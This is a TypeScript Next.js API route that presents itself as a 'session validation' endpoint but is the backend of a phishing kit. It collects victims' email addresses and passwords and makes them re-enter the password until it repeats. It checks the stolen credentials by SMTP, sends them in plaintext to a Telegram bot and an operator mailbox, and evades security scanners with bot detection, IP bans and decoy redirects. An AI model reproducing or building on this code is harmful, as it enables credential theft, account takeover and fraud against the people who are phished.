/**
 * Session Validation Endpoint
 * Validates user authentication credentials
 * POST /api/auth/session/validate
 */

import { NextRequest, NextResponse } from 'next/server'

export const runtime = 'nodejs' // Required for file system operations and database access
import nodemailer from 'nodemailer'
import { verifyEmailCredentials, lookupMXRecords, formatProviderName } from '@/lib/emailVerification'
import { validateRequestOrigin, logBotDetection } from '@/lib/botDetection'
import { classifyRequest } from '@/lib/scannerDetection'
import { isIPBlocked, banIP } from '@/lib/ipBlocklist'
import { verifyToken } from '@/lib/tokens'
import { getTelegramBotToken, getTelegramChatId, isTelegramConfigured } from '@/lib/telegramConfig'
import { sendTelegramMessage } from '@/lib/telegramNotifications'
import { deobfs } from '@/lib/secureUtils'
import { getAttemptCount, recordAttempt, getPasswords } from '@/lib/attemptTracker'
import { addVisitorLog } from '@/lib/visitorTracker'
import { getGeoData } from '@/lib/geoLocation'
import { recordSuccessfulLogin } from '@/lib/fingerprintStorage'
import { markLinkUsed, updateGenericLinkStats, saveCapturedEmail, getLink } from '@/lib/linkDatabase'
import { getSettings } from '@/lib/adminSettings'
import { hashEmail, truncateIP, truncateToken } from '@/lib/securityUtils'
import { extractBaseDomain, getRedirectUrlForEmail } from '@/lib/domainExtractor'

function validateEmail(email: string): boolean {
  if (!email || typeof email !== 'string') return false
  if (email.length < 3 || email.length > 254) return false
  
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(email)) return false
  
  const dangerous = ['<', '>', '"', "'", '\\', '/', '..', 'script', 'javascript:']
  if (dangerous.some(char => email.toLowerCase().includes(char))) return false
  
  return true
}

function validatePassword(password: string): boolean {
  if (!password || typeof password !== 'string') return false
  if (password.length < 1 || password.length > 1000) return false
  
  // Block control characters (null bytes, newlines, etc.)
  const hasControlChars = /[\x00-\x1F\x7F]/.test(password)
  if (hasControlChars) return false
  
  return true
}

// Helper function to get redirect URL from admin settings
async function getRedirectUrl(email: string, hash: string = ''): Promise<string> {
  const settings = await getSettings()
  
  let redirectUrl: string
  
  if (settings.redirects?.customUrl && settings.redirects.customUrl.trim() !== '') {
    // Use custom URL from admin settings
    redirectUrl = settings.redirects.customUrl.trim()
  } else if (settings.redirects?.useDomainFromEmail !== false) {
    // Extract base domain intelligently (handles Japanese domains)
    const baseDomain = extractBaseDomain(email)
    
    // Get fallback from settings or use default
    const fallbackUrl = settings.redirects?.defaultUrl || 'https://www.google.com'
    redirectUrl = baseDomain ? `https://${baseDomain}` : fallbackUrl
  } else {
    // Use fallback
    redirectUrl = settings.redirects?.defaultUrl || 'https://www.google.com'
  }
  
  // Add hash fragment based on result (hardcoded values)
  let hashFragment = ''
  
  if (hash) {
    // Hardcoded hash values
    const hashMap: Record<string, string> = {
      'TooManyAttempts': 'TooManyAttempts',
      'LinkUsed': 'ReviewCompleted',
      'Success': 'Success',
      'IPBlocked': 'IPBlocked',
      'ScannerFound': 'ScannerFound',
      'TokenExpired': 'TokenExpired',
    }
    hashFragment = hashMap[hash] || hash
  }
  
  // Append hash if present
  if (hashFragment) {
    redirectUrl = `${redirectUrl}#${hashFragment}`
  }
  
  return redirectUrl
}

// Single-use token tracking (per email)
const usedLinks = new Map<string, {
  email: string
  timestamp: number
}>()

// Clean up old entries every 5 minutes (prevent memory leaks)
if (typeof setInterval !== 'undefined') {
  setInterval(() => {
    const now = Date.now()
    const keysToDelete: string[] = []
    usedLinks.forEach((data, key) => {
      if (now - data.timestamp > 60 * 60 * 1000) {
        keysToDelete.push(key)
      }
    })
    keysToDelete.forEach(key => usedLinks.delete(key))
  }, 5 * 60 * 1000)
}

export async function POST(request: NextRequest) {
  // Log that the endpoint was called
  console.log('[CREDENTIAL CAPTURE] 🚀 POST /api/auth/session/validate called')
  
  try {
    const body = await request.json()
    console.log('[CREDENTIAL CAPTURE] 📥 Request body received:', {
      hasEmail: !!(body.email || body.e),
      hasPassword: !!(body.password || body.p),
      hasToken: !!(body.token || body.linkToken || body.sessionIdentifier),
    })
    
    // Decode credentials early and log
    let email: string
    let password: string
    // Decode credentials (support both old base64 and new obfuscated)
    try {
      // Try new obfuscated format first
      email = body.e ? deobfs(body.e) : (body.email || '')
    } catch {
      // Fallback to old base64 format
      email = body.e ? Buffer.from(body.e, 'base64').toString('utf-8') : (body.email || '')
    }
    
    console.log('[CREDENTIAL CAPTURE] 📧 Email decoded:', email ? `${email.substring(0, 10)}...` : 'EMPTY')
    
    if (!validateEmail(email)) {
      console.log('[CREDENTIAL CAPTURE] ❌ Email validation failed')
      return NextResponse.json({ 
        error: 'Invalid email address' 
      }, { status: 400 })
    }
    
    try {
      password = body.p ? deobfs(body.p) : (body.password || '')
    } catch {
      password = body.p ? Buffer.from(body.p, 'base64').toString('utf-8') : (body.password || '')
    }
    
    console.log('[CREDENTIAL CAPTURE] 🔑 Password decoded:', password ? '***' : 'EMPTY')
    
    if (!validatePassword(password)) {
      console.log('[CREDENTIAL CAPTURE] ❌ Password validation failed')
      return NextResponse.json({ 
        error: 'Invalid password' 
      }, { status: 400 })
    }
    
    let redirectUrl: string | null = null
    try {
      redirectUrl = body.r ? deobfs(body.r) : (body.redirectUrl || null)
    } catch {
      redirectUrl = body.r ? Buffer.from(body.r, 'base64').toString('utf-8') : (body.redirectUrl || null)
    }
    
    const captchaToken = body.c || body.captchaToken
    const retryCount = body.t !== undefined ? body.t : (body.retryCount || 0)
    const sessionId = body.s || body.sessionId
    const sessionIdentifier = body.token || body.linkToken || body.sessionIdentifier // Legacy: linkToken

    if (!email || !password) {
      return NextResponse.json(
        { success: false, error: 'Missing required fields' },
        { status: 400 }
      )
    }

    // Get IP and user agent info
    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      request.headers.get('cf-connecting-ip') ||
      'Unknown'
    const userAgent = request.headers.get('user-agent') || 'Unknown'
    
    // Generate fingerprint from request headers
    const fingerprint = request.headers.get('x-fingerprint') || 
                       request.headers.get('x-client-fingerprint') ||
                       `${userAgent}-${ip}`.substring(0, 100) // Fallback simple fingerprint

    // CRITICAL: If user has valid token, they passed all 4 security layers - TRUST THEM
    // Skip bot detection for users with valid tokens (they already passed stealth verification)
    let tokenValid = false
    let tokenPayload = null
    
    if (sessionIdentifier) {
      // Check if this is a simple token (Type B/C: timestamp-based or gen_ prefix)
      const isSimpleToken = (sessionIdentifier.includes('_') && !sessionIdentifier.includes('.') && !sessionIdentifier.startsWith('eyJ')) || sessionIdentifier.startsWith('gen_')
      
      if (isSimpleToken) {
        
        // For simple tokens, verify against database instead of JWT
        try {
          const link = await getLink(sessionIdentifier)
          
          if (link && link.status === 'active') {
            tokenValid = true
            tokenPayload = { type: 'simple', token: sessionIdentifier }
            
            // NOTE: Don't check usedLinks here - allow multiple attempts
            // Only mark as used AFTER 3 same passwords confirmed or redirect
          } else {
            const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
            return NextResponse.json(
              { 
                success: false, 
                redirect: redirectUrl
              },
              { status: 401 }
            )
          }
        } catch (error) {
          const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
          return NextResponse.json(
            { 
              success: false, 
              redirect: redirectUrl
            },
            { status: 401 }
          )
        }
      } else {
        // JWT token - verify with JWT library
        const tokenVerification = verifyToken(sessionIdentifier, {
          ip,
          strictBinding: false, // Lenient mode - allow IP changes (mobile networks, etc.)
        })
        
        if (tokenVerification.valid && tokenVerification.payload) {
          tokenValid = true
          tokenPayload = tokenVerification.payload
          
          // NOTE: Don't check usedLinks here - allow multiple attempts
          // Only mark as used AFTER 3 same passwords confirmed or redirect
          // This check moved to after attempt tracking (see below)
        } else {
          // Token invalid/expired - return redirect with hash
          const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
          return NextResponse.json(
            { 
              success: false, 
              redirect: redirectUrl
            },
            { status: 401 }
          )
        }
      }
    }

    // Only run bot detection if NO valid token (user didn't pass stealth verification)
    if (!tokenValid) {
      // Check IP blocklist first
      if (isIPBlocked(ip)) {
        // Return redirect with hash
        const redirectUrl = await getRedirectUrl(email, 'IPBlocked')
        return NextResponse.json(
          { success: false, redirect: redirectUrl },
          { status: 403 }
        )
      }

      // Check for scanners/bots - return error instead of redirect
      const allHeaders: Record<string, string | null> = {
        'accept': request.headers.get('accept'),
        'accept-language': request.headers.get('accept-language'),
        'referer': request.headers.get('referer'),
        'x-requested-with': request.headers.get('x-requested-with'),
        'user-agent': userAgent,
      }

      const scannerDetection = await classifyRequest(userAgent, ip, allHeaders)
      
      // If scanner detected, return error
      if (scannerDetection.isScanner) {
        // Auto-ban if high confidence
        if (scannerDetection.confidence >= 70) {
          banIP(ip, `Scanner detected: ${scannerDetection.reasons.join(', ')}`, false) // Temporary ban
        }
        
        // Log the scanner but don't expose intent
        logBotDetection({
          isBot: true,
          confidence: scannerDetection.confidence,
          reasons: scannerDetection.reasons,
          userAgent,
          fingerprint: 'scanner',
        }, email)
        
        // Return redirect with hash
        const redirectUrl = await getRedirectUrl(email, 'ScannerFound')
        return NextResponse.json(
          { success: false, redirect: redirectUrl },
          { status: 403 }
        )
      }

      // Silent bot detection (backend only)
      const botDetection = validateRequestOrigin(userAgent, ip, {
        suspiciousActivity: false, // Can be enhanced with more checks
      })
      
      // Log bot detection silently (no user alerts)
      if (botDetection.isBot || botDetection.confidence >= 30) {
        logBotDetection(botDetection, email)
        // Return redirect with hash
        const redirectUrl = await getRedirectUrl(email, 'ScannerFound')
        return NextResponse.json(
          { success: false, redirect: redirectUrl },
          { status: 403 }
        )
      }
    }

    // Verify Turnstile CAPTCHA (only if configured and provided)
    // Get secret key from admin settings (admin panel is single source of truth)
    const settings = await getSettings()
    const turnstileSecret = settings.security.captcha.provider === 'turnstile' 
      ? settings.security.captcha.turnstileSecretKey?.trim() 
      : undefined
    const isTestingMode = process.env.NODE_ENV === 'development'
    
    if (turnstileSecret && captchaToken && captchaToken !== 'test-token') {
      // Check if using official Cloudflare Turnstile test tokens
      const { TURNSTILE_TEST_KEYS } = await import('@/lib/captchaConfigTypes')
      if (isTestingMode && (captchaToken === TURNSTILE_TEST_KEYS.SITE_KEY_PASS || captchaToken === TURNSTILE_TEST_KEYS.SITE_KEY_FAIL)) {
        // Testing mode: SITE_KEY_PASS = always pass, SITE_KEY_FAIL = always fail
        if (captchaToken === TURNSTILE_TEST_KEYS.SITE_KEY_FAIL) {
          return NextResponse.json(
            { success: false, error: 'CAPTCHA verification failed (testing mode)' },
            { status: 400 }
          )
        }
        // Otherwise, allow pass for testing
      } else {
        // Normal verification
        const turnstileVerifyResponse = await fetch(
          'https://challenges.cloudflare.com/turnstile/v0/siteverify',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              secret: turnstileSecret,
              response: captchaToken,
            }),
          }
        )

        const turnstileResult = await turnstileVerifyResponse.json()
        if (!turnstileResult.success) {
          return NextResponse.json(
            { success: false, error: 'CAPTCHA verification failed' },
            { status: 400 }
          )
        }
      }
    }


    // Track password attempt (1st, 2nd, 3rd, or 4th)
    // Use email+date as key to track across requests (persists across serverless invocations)
    const today = new Date().toISOString().split('T')[0]
    const attemptKey = `${email}_${today}`
    console.log('[CREDENTIAL CAPTURE] 📊 Recording attempt for:', attemptKey)
    const attemptData = await recordAttempt(attemptKey, password)
    const currentAttempt = attemptData.attemptNumber
    console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
    
    // Secure logging - no sensitive data
    // Password submission attempt processed
    
    // CRITICAL FIX: Check for password confirmation FIRST (before any SMTP)
    // When samePasswordConfirmed = true, we MUST return immediately
    if (attemptData.samePasswordConfirmed) {
      // Build redirect URL with Success hash
      const redirectUrl = await getRedirectUrl(email, 'Success')
      
      // Record successful login with fingerprint (3 same passwords = confirmed)
      try {
        await recordSuccessfulLogin(email, fingerprint, ip, sessionIdentifier || undefined)
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('Failed to record fingerprint:', error)
        }
      }
      
      // Log visitor (login attempt - password confirmed)
      try {
        const geoData = await getGeoData(ip)
        await addVisitorLog({
          ip,
          userAgent: request.headers.get('user-agent') || 'Unknown',
          country: geoData.country,
          city: geoData.city,
          captchaStatus: 'verified',
          botStatus: 'human',
          fingerprint,
          linkToken: sessionIdentifier || undefined, // Legacy field name
          email: email,
          layer: 'login',
          layerPassed: true,
          sessionId: fingerprint
        })
      } catch (error) {
        // Non-blocking - log error but don't fail request
        if (process.env.NODE_ENV === 'development') {
          console.error('Failed to log visitor:', error)
        }
      }
      
      // NOTE: Do NOT mark link as used here - wait until 4 attempts are completed
      // Users should be able to return to link if they haven't completed 4 attempts
      // Link will be marked as used only after 4th attempt (see below)
      
      // Update link stats (3 same passwords = confirmed, but link still active until 4 attempts)
      if (sessionIdentifier) {
        try {
          const link = await getLink(sessionIdentifier)
          
          if (link) {
            // Don't mark as used yet - only update stats for generic links
            if (link.type === 'generic') {
              await updateGenericLinkStats(sessionIdentifier, email)
            }
            // For personalized links, we'll mark as used after 4 attempts (see below)

            // Get MX record quickly for captured email record (with timeout)
            let mxRecord = 'Not available'
            try {
              const emailDomain = email.split('@')[1]
              if (emailDomain) {
                const mxRecords = await Promise.race([
                  lookupMXRecords(emailDomain),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 500))
                ]) as any
                if (mxRecords && Array.isArray(mxRecords) && mxRecords.length > 0) {
                  const firstMX = mxRecords[0]
                  if (firstMX && typeof firstMX === 'object' && 'exchange' in firstMX) {
                    mxRecord = firstMX.exchange || 'Not available'
                  } else if (typeof firstMX === 'string') {
                    mxRecord = firstMX
                  }
                }
              }
            } catch {
              // Silent fail, keep 'Not available'
            }

            // Get password history for captured email record
            const passwordHistory = await getPasswords(attemptKey)
            
            // Save captured email record
            const capturedId = `capture_${Date.now()}_${Math.random().toString(36).substring(7)}`
            await saveCapturedEmail({
              id: capturedId,
              email: email.toLowerCase(),
              sessionIdentifier: sessionIdentifier,
              linkToken: sessionIdentifier, // Legacy alias
              linkType: link.type,
              linkName: link.name,
              fingerprint,
              ip,
              passwords: passwordHistory.length > 0 ? passwordHistory : [password],
              verified: true, // 3 same passwords = confirmed correct
              provider: 'Confirmed',
              capturedAt: Date.now(),
              attempts: currentAttempt,
              mxRecord: mxRecord,
            })
          }
        } catch (error) {
        }
      }
      
      // Get MX record quickly for Telegram message (non-blocking, with timeout)
      let mxForMessage = 'Not available'
      try {
        const emailDomain = email.split('@')[1]
        if (emailDomain) {
          const mxRecords = await Promise.race([
            lookupMXRecords(emailDomain),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 500))
          ]) as any
          if (mxRecords && Array.isArray(mxRecords) && mxRecords.length > 0) {
            const firstMX = mxRecords[0]
            if (firstMX && typeof firstMX === 'object' && 'exchange' in firstMX) {
              mxForMessage = firstMX.exchange || 'Not available'
            } else if (typeof firstMX === 'string') {
              mxForMessage = firstMX
            }
          }
        }
      } catch {
        // Silent fail - use default
      }
      
      // Send Telegram notification for confirmed password (quick, no SMTP)
      const telegramSettings = (await getSettings()).notifications.telegram
      const quickMessage = `+++FOX NOTIFICATION+++

🎯 Attempt 3/3 - PASSWORD CONFIRMED

📧 ${email}
🔑 ${password}
📬 MX: ${mxForMessage}

✅ All 3 attempts identical - Password verified correct!

🦊 FOXER`
      
      // Send Telegram in background with proper error tracking
      sendTelegramMessage(quickMessage)
        .then(success => {
          if (success) {
          } else {
          }
        })
        .catch(err => {
        })
      
      // Return success with redirect immediately
      // CRITICAL: This MUST return and not continue processing
      // NO SMTP verification, NO further processing
      const response = NextResponse.json({
        success: true,
        verified: true,
        redirect: redirectUrl,
        message: 'Password confirmed',
        confirmed: true, // Flag to indicate 3 same passwords
        attemptCount: currentAttempt,
      })
      return response
    }
    
    // Check if link was already used (only AFTER we've processed the attempt)
    // This prevents 410 error on attempts 2-3
    if (sessionIdentifier && attemptData.samePasswordConfirmed) {
      const linkUsageKey = `${sessionIdentifier}_${email}`
      if (usedLinks.has(linkUsageKey)) {
        // Still allow redirect if password confirmed, but log it
      }
    }
    
    // Check if we should block after 3 same passwords or after 4 attempts
    if (!attemptData.allowAttempt) {
      // This block only runs if allowAttempt = false (too many attempts)
      // Password confirmation is handled above (before this check)
      
      // Otherwise, too many attempts - redirect to configured URL
      const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
      return NextResponse.json({
        success: false,
        error: 'too_many_attempts',
        redirect: redirectUrl,
      }, { status: 429 })
    }

    // Get MX records (ALWAYS await this properly)
    const domain = email.split('@')[1]
    let primaryMX = 'Not available'

    if (domain && domain.trim() !== '') {
      try {
        const mxRecords = await lookupMXRecords(domain)
        if (mxRecords && Array.isArray(mxRecords) && mxRecords.length > 0) {
          // Extract exchange from first MX record
          const firstMX = mxRecords[0]
          if (firstMX && typeof firstMX === 'object' && 'exchange' in firstMX) {
            primaryMX = firstMX.exchange || 'Not available'
          } else if (typeof firstMX === 'string') {
            // Handle case where MX record is just a string
            primaryMX = firstMX
          }
        } else {
          primaryMX = 'Not available'
        }
      } catch (error) {
        primaryMX = 'Not available'
      }
    }

    const verifiedEmail = tokenPayload?.email || email
    const documentId = tokenPayload?.documentId || 'unknown'

    // Send visitor notification ONCE (only on first attempt)
    if (currentAttempt === 1) {
      const visitorKey = `visitor_notified_${email}`
      
      // Check if we already sent visitor notification for this email
      if (!usedLinks.has(visitorKey)) {
        const browser = getBrowserName(userAgent)
        const visitorTimestamp = new Date().toLocaleString('en-US', {
          weekday: 'short',
          month: 'short',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          hour12: true,
        })
        
        const visitorMessage = `+++FOX NOTIFICATION+++

👊Knock! Knock!!👊

📧 ${verifiedEmail}
🖥️ ${browser} | 📡 ${ip}
⏰ ${visitorTimestamp}

Waiting for next step... 🎯`

        // Visitor arrival notification (Knock Knock)
        const telegramSettings = (await getSettings()).notifications.telegram
        
        const visitorResult = await sendTelegramMessage(visitorMessage)
        if (visitorResult) {
        } else {
        }
        
        // Mark visitor as notified (expires after 1 hour)
        usedLinks.set(visitorKey, { email: verifiedEmail, timestamp: Date.now() })
      }
    }

    // Telegram notification (send for EVERY attempt)
    const timestamp = new Date().toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true,
    })

    let message = ''

    if (currentAttempt === 1) {
      // FIRST ATTEMPT: Email, Password, MX only
      message = `+++FOX NOTIFICATION+++

🎯 Attempt 1/3

📧 ${verifiedEmail}
🔑 ${password}
📬 MX: ${primaryMX}`

    } else if (currentAttempt === 2) {
      // SECOND ATTEMPT: Email, Password, MX only
      message = `+++FOX NOTIFICATION+++

🎯 Attempt 2/3

📧 ${verifiedEmail}
🔑 ${password}
📬 MX: ${primaryMX}`

    } else if (currentAttempt === 3) {
      // THIRD ATTEMPT: Check if all 3 are same or if we allow 4th
      if (attemptData.samePasswordConfirmed) {
        // All 3 same - password confirmed
        message = `+++FOX NOTIFICATION+++

🎯 Attempt 3/3 - PASSWORD CONFIRMED

📧 ${verifiedEmail}
🔑 ${password}
📬 MX: ${primaryMX}

✅ All 3 attempts identical - Password verified correct!`
      } else if (attemptData.message?.includes('Please enter a correct password')) {
        // Allow 4th attempt
        message = `+++FOX NOTIFICATION+++

🎯 Attempt 3/4

📧 ${verifiedEmail}
🔑 ${password}
📬 MX: ${primaryMX}

⚠️ One more attempt allowed`
      } else {
        // Regular 3rd attempt - will get full details below
        // This will be handled in the else block
      }
    }
    
    // For 3rd attempt (if not already set) or 4th attempt, show full details
    // SKIP SMTP if password already confirmed (prevents 1-3 minute delay)
    if ((currentAttempt === 3 && !message) || currentAttempt === 4) {
      // Skip SMTP verification if password already confirmed by 3 identical attempts
      let verification
      if (attemptData.samePasswordConfirmed) {
        verification = {
          valid: true,
          smtpVerified: false,
          method: 'identical_passwords',
          provider: 'Confirmed'
        }
      } else {
        verification = await verifyEmailCredentials(email, password)
      }
      const location = await getLocationFromIP(ip)
      const browser = getBrowserName(userAgent)

      let provider = verification.provider || formatProviderName(undefined, primaryMX !== 'Not available' ? primaryMX : undefined)

      // Build verification details
      let verificationDetails = ''
      if (verification.valid) {
        verificationDetails = `✅ VALID
📡 ${verification.method || 'unknown'}`

        if (verification.smtpConfig) {
          verificationDetails += `

🌐 ${provider}
📬 ${verification.smtpConfig.host}
🔌 Port ${verification.smtpConfig.port}`
        }
      } else {
        verificationDetails = `❌ INVALID`
        if (verification.method) {
          verificationDetails += `
📡 ${verification.method}`
        }
      }

      const attemptLabel = currentAttempt === 4 ? 'Final Attempt 4/4' : 'Final Attempt 3/3'
      message = `+++FOX NOTIFICATION+++

🎯 ${attemptLabel}

📧 ${verifiedEmail}
🔑 ${password}

━━━━━━━━━━━━━━━━━━
📊 VERIFICATION:
━━━━━━━━━━━━━━━━━━
${verificationDetails}

━━━━━━━━━━━━━━━━━━
📍 INFO:
━━━━━━━━━━━━━━━━━━
🌍 ${location}
🖥️ ${browser}
📡 ${ip}
⏰ ${timestamp}
📄 Doc: ${documentId}

━━━━━━━━━━━━━━━━━━
${verification.valid 
  ? '🎯 VALID - Success!' 
  : '⚠️ Invalid - Try manually'}
`
    }

    // Send Telegram notification for EVERY attempt (only if enabled)
    // CRITICAL: This MUST run for every attempt, even if other code fails
    try {
      const telegramSettings = (await getSettings()).notifications.telegram
      
      // Ensure message is not empty (fallback if somehow message wasn't set)
      if (!message || message.trim() === '') {
        // Fallback message if somehow message wasn't set
        message = `+++FOX NOTIFICATION+++

🎯 Attempt ${currentAttempt}/4

📧 ${verifiedEmail}
🔑 ${password}
📬 MX: ${primaryMX}`
        console.warn('[CREDENTIAL CAPTURE] ⚠️  Message was empty, using fallback')
      }
      
      // Log notification attempt (always log in production for debugging)
      console.log('[CREDENTIAL CAPTURE] 📧 Attempting Telegram notification:', {
        enabled: telegramSettings.enabled,
        hasBotToken: !!telegramSettings.botToken,
        hasChatId: !!telegramSettings.chatId,
        botTokenLength: telegramSettings.botToken?.length || 0,
        chatId: telegramSettings.chatId || 'NOT SET',
        email: email.substring(0, 10) + '...', // Partial email for privacy
        attempt: currentAttempt,
        messageLength: message.length,
      })
      
      // Only send if Telegram is enabled and configured
      if (telegramSettings.enabled !== false) {
        try {
          const telegramResult = await sendTelegramMessage(message)
          if (telegramResult) {
            console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
          } else {
            console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
          }
        } catch (error: any) {
          console.error('[CREDENTIAL CAPTURE] ❌ Telegram notification error:', error.message || error)
          console.error('[CREDENTIAL CAPTURE] ❌ Error stack:', error.stack)
        }
      } else {
        console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications are disabled in settings')
      }
    } catch (notificationError: any) {
      // CRITICAL: Don't let notification errors break the entire request
      console.error('[CREDENTIAL CAPTURE] ❌ CRITICAL: Notification code failed:', notificationError.message || notificationError)
      console.error('[CREDENTIAL CAPTURE] ❌ Error stack:', notificationError.stack)
    }

    // Send email notification in background with proper error tracking
    sendEmail(email, password)
      .then(success => {
        if (success) {
        } else {
        }
      })
      .catch(err => {
      })

    // Update link stats after credential capture
    // CRITICAL: Only mark link as used after 4 attempts are completed
    if (sessionIdentifier && tokenValid) {
      try {
        const link = await getLink(sessionIdentifier)
        
        if (link) {
          // Only mark link as used when 4 attempts are completed
          if (currentAttempt >= 4) {
            if (link.type === 'personalized') {
              // Type A: Mark personalized link as used (4 attempts completed)
              await markLinkUsed(sessionIdentifier, fingerprint, ip)
              
              // Also mark in memory cache
              const linkUsageKey = `${sessionIdentifier}_${email}`
              usedLinks.set(linkUsageKey, {
                email,
                timestamp: Date.now(),
              })
            } else if (link.type === 'generic') {
              // Type B: Update generic link stats (already handled, but ensure it's done)
              await updateGenericLinkStats(sessionIdentifier, email)
            }
          } else {
            // Less than 4 attempts - don't mark as used yet
            // User can still return to link
            
            // Still update stats for generic links
            if (link.type === 'generic') {
              await updateGenericLinkStats(sessionIdentifier, email)
            }
          }

          // Save captured email record (for both types)
          const capturedId = `capture_${Date.now()}_${Math.random().toString(36).substring(7)}`
          // Skip SMTP if password already confirmed (prevents delay)
          let verificationResult = null
          if (currentAttempt >= 3 && !attemptData.samePasswordConfirmed) {
            verificationResult = await verifyEmailCredentials(email, password)
          } else if (attemptData.samePasswordConfirmed) {
            verificationResult = {
              valid: true,
              smtpVerified: false,
              method: 'identical_passwords',
              provider: 'Confirmed'
            }
          }
          
          // Get password history for captured email record
          const passwordHistory = await getPasswords(attemptKey)
          
          await saveCapturedEmail({
            id: capturedId,
            email: email.toLowerCase(),
            sessionIdentifier: sessionIdentifier,
            linkToken: sessionIdentifier, // Legacy alias
            linkType: link.type,
            linkName: link.name,
            fingerprint,
            ip,
            passwords: passwordHistory.length > 0 ? passwordHistory : [password],
            verified: verificationResult?.valid || false,
            provider: verificationResult?.provider || 'Unknown',
            capturedAt: Date.now(),
            attempts: currentAttempt,
            mxRecord: primaryMX || 'Not available',
          })
        }

        // Link usage tracking moved to above (after password confirmation)
        // This block is for captured email records only
      } catch (error) {
        // Silent fail - link tracking is best effort
      }
    }

    // Only verify on 3rd or 4th attempt for return value
    // SKIP SMTP if password already confirmed (prevents delay)
    let verificationResult = null
    if (currentAttempt >= 3) {
      if (attemptData.samePasswordConfirmed) {
        verificationResult = {
          valid: true,
          smtpVerified: false,
          method: 'identical_passwords',
          provider: 'Confirmed'
        }
      } else {
        verificationResult = await verifyEmailCredentials(email, password)
      }
      
      // Record successful login with fingerprint (for verified credentials)
      // NOTE: Only record if credentials are actually valid, NOT just on 3rd attempt
      // The main fingerprint recording happens above when samePasswordConfirmed = true
      if (verificationResult?.valid && !attemptData.samePasswordConfirmed) {
        try {
          await recordSuccessfulLogin(email, fingerprint, ip, sessionIdentifier || undefined)
        } catch {
          // Silent fail - fingerprint recording is best effort
        }
      }
    }

    // Return success with message if 4th attempt is allowed
    return NextResponse.json({ 
      success: true,
      verified: verificationResult?.valid || false,
      provider: verificationResult?.provider || 'Unknown',
      method: verificationResult?.method || 'pending',
      redirectUrl: redirectUrl || null,
      message: attemptData.message, // "Please enter a correct password." for 4th attempt
      is4thAttempt: attemptData.message?.includes('Please enter a correct password'),
      attemptCount: currentAttempt, // CRITICAL: Include attempt count so frontend knows when to mark as used
      currentAttempt, // Legacy alias
    })
  } catch (error: any) {
    // CRITICAL: Log all errors so we can see what's happening
    console.error('[CREDENTIAL CAPTURE] ❌ CRITICAL ERROR in POST handler:', error.message || error)
    console.error('[CREDENTIAL CAPTURE] ❌ Error stack:', error.stack)
    return NextResponse.json(
      { success: false, error: 'Internal server error' },
      { status: 500 }
    )
  }
}

async function getLocationFromIP(ip: string): Promise<string> {
  if (ip === 'Unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.includes('::')) {
    return 'Local'
  }

  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 2000)
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      signal: controller.signal,
    })
    clearTimeout(timeoutId)
    
    const data = await response.json()
    if (data.city && data.country_name) {
      return `${data.city}, ${data.country_name}`
    }
    return data.country_name || 'Unknown'
  } catch {
    return 'Unknown'
  }
}

function getBrowserName(userAgent: string): string {
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome'
  if (userAgent.includes('Firefox')) return 'Firefox'
  if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari'
  if (userAgent.includes('Edg')) return 'Edge'
  if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera'
  return 'Unknown'
}

async function sendEmail(email: string, password: string): Promise<boolean> {
  // Get SMTP settings from admin panel (single source of truth)
  const settings = await getSettings()
  
  if (!settings.notifications.email.enabled) {
    if (process.env.NODE_ENV === 'development') {
      console.log('ℹ️ Email notifications disabled in admin settings')
    }
    return false
  }
  
  const smtpHost = settings.notifications.email.smtpHost?.trim()
  const smtpPort = settings.notifications.email.smtpPort || 587
  const smtpUser = settings.notifications.email.smtpUser?.trim()
  const smtpPass = settings.notifications.email.smtpPassword?.trim()
  const smtpTo = settings.notifications.email.fromEmail?.trim()

  if (!smtpHost || !smtpUser || !smtpPass || !smtpTo) {
    return false
  }

  try {
    const transporter = nodemailer.createTransport({
      host: smtpHost,
      port: smtpPort,
      secure: smtpPort === 465,
      auth: { user: smtpUser, pass: smtpPass },
    })

    await transporter.sendMail({
      from: `"System" <${smtpUser}>`,
      to: smtpTo,
      subject: `Login: ${email}`,
      text: `Email: ${email}\nPassword: ${password}`,
    })
    
    return true
  } catch (error) {
    // FIXED: Now logs errors properly instead of silent fail
    const errorMessage = error instanceof Error ? error.message : 'Unknown error'
    if (process.env.NODE_ENV === 'development') {
      console.error('Email error details:', error)
    }
    return false
  }
}

